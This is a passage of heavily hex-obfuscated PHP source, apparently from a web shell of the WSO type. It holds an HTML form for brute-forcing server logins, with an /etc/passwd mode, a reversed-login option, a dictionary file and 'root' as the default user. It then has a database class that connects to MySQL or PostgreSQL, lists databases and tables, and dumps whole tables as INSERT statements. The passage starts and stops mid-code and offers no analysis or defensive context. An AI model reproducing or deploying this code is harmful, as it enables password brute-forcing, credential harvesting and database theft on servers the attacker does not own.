</opti\x6f\x6e\x3e</s\x65\x6ce\x63t\x3e</\x74\x64\x3e</\x74\x72\x3e\x3ct\x72\x3e<\x74\x64\x3e"."\x3cin\x70ut t\x79\x70e=h\x69d\x64\x65n\x20\x6e\x61\x6d\x65=\x63\x20v\x61l\x75e=\x22".htmlspecialchars($GLOBALS["cw\x64"])."\x22>"."\x3c\x69n\x70\x75\x74\x20\x74\x79\x70e=\x68i\x64den n\x61m\x65\x3da \x76alue\x3d\"".htmlspecialchars($_POST["a"])."\x22\x3e"."<\x69nput\x20\x74yp\x65\x3d\x68i\x64\x64en na\x6d\x65=c\x68a\x72\x73\x65\x74 \x76a\x6c\x75\x65=\"".htmlspecialchars($_POST["cha\x72\x73\x65\x74"])."\"\x3e"."\x3csp\x61\x6e\x3eServe\x72:port</span\x3e\x3c/t\x64>"."\x3ctd\x3e<in\x70\x75\x74 \x74y\x70e=t\x65xt\x20\x6ea\x6d\x65\x3d\x73\x65rv\x65r\x20v\x61\x6cu\x65=\x2212\x37\x2e0.\x30\x2e1\">\x3c/\x74d\x3e</\x74r>"."<\x74\x72\x3e<td\x3e<\x73pa\x6e\x3eBr\x75\x74e \x74y\x70\x65\x3c/\x73\x70a\x6e\x3e\x3c/t\x64>"."<\x74\x64\x3e\x3c\x6cabe\x6c><i\x6e\x70ut\x20\x74y\x70\x65\x3d\x72a\x64\x69o \x6eam\x65=typ\x65 \x76\x61\x6cu\x65\x3d\"\x31\x22 \x63\x68e\x63\x6b\x65d\x3e\x20/et\x63/\x70a\x73s\x77d</l\x61be\x6c>\x3c/\x74d\x3e\x3c/tr\x3e"."\x3c\x74\x72\x3e\x3ctd>\x3c/td>\x3c\x74\x64\x3e<\x6c\x61\x62\x65\x6c\x20\x73t\x79\x6ce=\"\x70ad\x64\x69n\x67-\x6ce\x66\x74:1\x35p\x78\"\x3e\x3ci\x6e\x70ut t\x79\x70e\x3d\x63\x68\x65\x63\x6b\x62o\x78\x20na\x6de\x3d\x72\x65ve\x72\x73e v\x61lu\x65=\x31\x20c\x68e\x63\x6bed\x3e\x20\x72e\x76ers\x65 (\x6cogi\x6e -> nig\x6f\x6c)</la\x62\x65l\x3e</t\x64\x3e</\x74r\x3e"."\x3c\x74r\x3e<td>\x3c/\x74d\x3e<td\x3e<\x6c\x61\x62e\x6c\x3e\x3c\x69\x6ep\x75t \x74\x79\x70e=\x72adi\x6f\x20\x6e\x61\x6d\x65\x3dt\x79\x70\x65 \x76\x61lue\x3d\x222\x22>\x20Dic\x74io\x6ea\x72\x79</\x6c\x61\x62\x65l\x3e\x3c/\x74d></t\x72\x3e"."<t\x72\x3e<td\x3e</t\x64\x3e\x3c\x74d>\x3c\x74a\x62\x6ce s\x74yl\x65\x3d\"p\x61d\x64\x69\x6e\x67-l\x65\x66t:15px\"><tr\x3e\x3c\x74\x64><\x73pa\x6e\x3e\x4cog\x69\x6e</\x73pan\x3e</\x74d\x3e"."\x3c\x74d><in\x70\x75t\x20t\x79pe=\x74ex\x74\x20\x6eam\x65=\x6cogin\x20\x76alue=\x22root\"></t\x64\x3e</t\x72\x3e"."\x3c\x74\x72\x3e\x3ctd><\x73p\x61\x6e\x3e\x44\x69\x63\x74i\x6f\x6e\x61\x72\x79</sp\x61n\x3e\x3c/\x74\x64>"."\x3ct\x64>\x3c\x69\x6epu\x74 t\x79p\x65=t\x65xt\x20na\x6de=\x64\x69ct v\x61\x6cue\x3d\x22".htmlspecialchars($GLOBALS["c\x77d"])."pa\x73\x73wd\x2e\x64i\x63\x22>\x3c/t\x64\x3e\x3c/t\x72></\x74\x61\x62\x6ce\x3e"."\x3c/t\x64\x3e</tr>\x3ctr\x3e\x3c\x74d>\x3c/t\x64\x3e\x3ctd>\x3c\x69n\x70u\x74\x20\x74y\x70e=\x73u\x62mit \x76a\x6cu\x65=\"S\x75\x62\x6d\x69\x74\x22\x3e</\x74d\x3e\x3c/t\x72>\x3c/\x66or\x6d\x3e\x3c/tab\x6ce>";echo"\x3c/\x64iv><\x62\x72\x3e";printFooter();}function actionSql(){class DbClass{var$type;var$link;var$res;function DbClass($type){$zbswrwvp="\x74y\x70\x65";$this->type=${$zbswrwvp};}function connect($host,$user,$pass,$dbname){${"GL\x4f\x42ALS"}["\x72\x70j\x76xl"]="\x75s\x65\x72";switch($this->type){case"\x6d\x79s\x71l":if($this->link=@mysql_connect($host,${${"\x47L\x4f\x42\x41\x4c\x53"}["\x72pjv\x78l"]},${${"GL\x4f\x42\x41\x4c\x53"}["w\x72\x71\x67s\x78ohx\x62"]},true))return true;break;case"\x70\x67\x73\x71l":$host=explode(":",$host);if(!$host[1])$host[1]=5432;if($this->link=@pg_connect("h\x6fs\x74={$host[0]}\x20p\x6f\x72t\x3d{$host[1]}\x20\x75\x73e\x72\x3d$user \x70a\x73s\x77o\x72d\x3d$pass\x20\x64\x62n\x61m\x65\x3d$dbname"))return true;break;}return false;}function selectdb($db){switch($this->type){case"my\x73ql":if(@mysql_select_db(${${"\x47\x4cOBA\x4c\x53"}["a\x6fk\x77w\x63\x71f\x6ftm"]}))return true;break;}return false;}function query($str){$lkdcclcdux="\x73t\x72";switch($this->type){case"m\x79\x73q\x6c":return$this->res=@mysql_query(${${"GL\x4f\x42\x41L\x53"}["\x67\x6dn\x62\x6f\x72\x6a\x78d\x6a\x73\x71"]});break;case"\x70\x67\x73\x71l":return$this->res=@pg_query($this->link,${$lkdcclcdux});break;}return false;}function fetch(){$kmpfmswh="\x72\x65s";${"GLOBA\x4c\x53"}["\x75in\x63yx\x68giu\x66"]="\x72\x65s";${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["u\x69nc\x79\x78hg\x69\x75f"]}=func_num_args()?func_get_arg(0):$this->res;switch($this->type){case"\x6dys\x71l":return@mysql_fetch_assoc(${${"\x47\x4c\x4fB\x41\x4cS"}["\x66\x7a\x63v\x78\x6c\x6ep"]});break;case"\x70\x67\x73ql":return@pg_fetch_assoc(${$kmpfmswh});break;}return false;}function listDbs(){switch($this->type){case"\x6dys\x71l":return$this->res=@mysql_list_dbs($this->link);break;case"\x70g\x73ql":return$this->res=$this->query("\x53\x45\x4cE\x43T\x20dat\x6ea\x6d\x65\x20\x46R\x4fM\x20\x70g_d\x61\x74\x61\x62as\x65");break;}return false;}function listTables(){switch($this->type){case"mysql":return$this->res=$this->query("\x53\x48\x4fW \x54A\x42\x4c\x45S");break;case"p\x67sql":return$this->res=$this->query("sel\x65\x63\x74\x20ta\x62\x6c\x65_\x6eame f\x72om \x69\x6ef\x6frmation_s\x63\x68\x65ma\x2e\x74\x61b\x6c\x65s\x20w\x68\x65\x72e\x20(\x74a\x62l\x65_s\x63hem\x61\x20\x21\x3d \x27in\x66o\x72\x6dati\x6fn\x5f\x73ch\x65ma\x27 \x41N\x44 tabl\x65_schema \x21\x3d\x20\x27\x70g_\x63\x61\x74\x61log') \x6fr\x20\x74a\x62l\x65_n\x61\x6de \x3d\x20\x27\x70g_u\x73\x65\x72\x27");break;}return false;}function error(){switch($this->type){case"\x6d\x79sql":return@mysql_error($this->link);break;case"pg\x73ql":return@pg_last_error($this->link);break;}return false;}function setCharset($str){${"G\x4cOB\x41L\x53"}["\x68p\x72\x6e\x79\x6bl\x72\x71\x6aww"]="\x73\x74\x72";${"\x47\x4c\x4f\x42\x41\x4cS"}["dh\x64\x63\x65\x64nq"]="\x73\x74r";switch($this->type){case"\x6dys\x71l":if(function_exists("mysql\x5fs\x65\x74\x5f\x63h\x61\x72se\x74"))return@mysql_set_charset(${${"\x47LO\x42\x41\x4c\x53"}["\x68\x70\x72\x6ey\x6b\x6c\x72\x71j\x77\x77"]},$this->link);else$this->query("\x53ET \x43\x48\x41\x52\x53\x45T ".${${"\x47L\x4f\x42AL\x53"}["\x67\x6dnb\x6f\x72\x6a\x78\x64\x6a\x73\x71"]});break;case"m\x79sql":return@pg_set_client_encoding($this->link,${${"\x47L\x4fBALS"}["\x64h\x64\x63ed\x6e\x71"]});break;}return false;}function dump($table){${"\x47\x4cO\x42\x41\x4c\x53"}["\x6e\x78\x65\x66\x78n\x76\x7an"]="c\x72e\x61te";$bdoirrx="r\x65\x73";$ylguwgplglg="\x69\x74e\x6d";${"GLO\x42\x41\x4c\x53"}["k\x6b\x6e\x77\x78\x74ks\x6a\x69\x79l"]="ta\x62\x6ce";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x61\x77\x68\x76q\x69y\x69\x71"]="\x69\x74e\x6d";$topasgsdlxn="\x74\x61\x62l\x65";$cwkytdvhu="c\x72eat\x65";$xetmqdheki="ta\x62\x6c\x65";switch($this->type){case"\x6d\x79sq\x6c":${${"G\x4c\x4f\x42\x41L\x53"}["f\x7a\x63v\x78l\x6e\x70"]}=$this->query("\x53\x48\x4f\x57 CR\x45A\x54\x45\x20TA\x42\x4cE\x20`".${$xetmqdheki}."`");${$cwkytdvhu}=mysql_fetch_array(${$bdoirrx});echo${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x6e\x78\x65\x66\x78n\x76\x7an"]}[1].";\n\n";$this->query("SEL\x45\x43T\x20*\x20F\x52O\x4d `".${$topasgsdlxn}."`");while(${$ylguwgplglg}=$this->fetch()){$osepckuc="i\x74em";$awlijwtkoaoy="\x63\x6f\x6c\x75m\x6e\x73";$cxjedpxbwnr="\x6b";${"GL\x4f\x42\x41L\x53"}["t\x78tek\x63\x6an\x61\x75\x68\x62"]="v";${$awlijwtkoaoy}=array();${"G\x4c\x4fBA\x4c\x53"}["\x6e\x74\x65\x6byk\x74"]="\x69\x74\x65\x6d";${"GL\x4fB\x41\x4cS"}["x\x67u\x77\x79g"]="col\x75\x6dns";foreach(${$osepckuc} as${$cxjedpxbwnr}=>${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x74xt\x65\x6b\x63j\x6ea\x75\x68\x62"]}){$btlltcmy="it\x65\x6d";${"G\x4c\x4f\x42A\x4cS"}["\x64thviq\x78i\x65"]="\x6b";${$btlltcmy}[${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x64\x74\x68\x76\x69\x71\x78\x69e"]}]="\x27".@mysql_real_escape_string(${${"\x47\x4cO\x42A\x4c\x53"}["\x62\x69n\x6e\x79\x74\x65\x72\x79"]})."\x27";${${"G\x4c\x4f\x42\x41\x4cS"}["\x6a\x73\x71m\x68f\x65\x71y"]}[]="`".${${"\x47\x4c\x4f\x42A\x4cS"}["\x66\x77b\x74\x6cx\x6b\x67\x6f\x69\x77"]}."`";}echo"\x49N\x53E\x52\x54\x20I\x4eTO\x20`".${${"G\x4cO\x42AL\x53"}["x\x6a\x76e\x65gn\x74t"]}."\x60\x20(".implode(", ",${${"\x47L\x4f\x42\x41L\x53"}["\x78\x67\x75\x77\x79g"]}).")\x20\x56\x41\x4c\x55\x45\x53\x20(".implode(", ",${${"\x47\x4cOB\x41\x4cS"}["\x6e\x74eky\x6b\x74"]}).")\x3b"."\n";}break;case"p\x67\x73ql":$this->query("SE\x4cE\x43T * F\x52\x4f\x4d ".${${"G\x4cO\x42\x41LS"}["kk\x6e\x77x\x74\x6b\x73\x6ai\x79\x6c"]});while(${${"GL\x4f\x42\x41\x4c\x53"}["\x61\x77h\x76\x71iy\x69\x71"]}=$this->fetch()){$knpqrhuooyo="c\x6fl\x75\x6d\x6es";$gypbamlki="v";$psyhhmmdigul="\x74